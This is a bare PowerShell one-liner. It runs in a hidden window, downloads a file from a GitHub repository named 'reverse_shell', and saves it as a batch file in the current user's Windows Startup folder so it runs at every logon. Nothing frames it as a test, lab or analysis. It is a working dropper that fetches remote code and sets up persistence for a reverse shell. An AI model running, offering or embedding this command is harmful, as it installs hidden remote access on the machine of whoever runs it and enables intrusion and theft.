powershell -WindowStyle hidden -Command "$Username=$env:USERNAME; $GitHubUrl='https://raw.githubusercontent.com/HlibShutov/reverse_shell/main/shell'; $DestinationPath=\"C:\Users\$Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"; New-Item -ItemType Directory -Path $DestinationPath -Force; Invoke-WebRequest -Uri $GitHubUrl -OutFile \"$DestinationPath\yourfile.bat\"; Write-Output \"File downloaded from GitHub and saved to: $DestinationPath\yourfile.bat\""
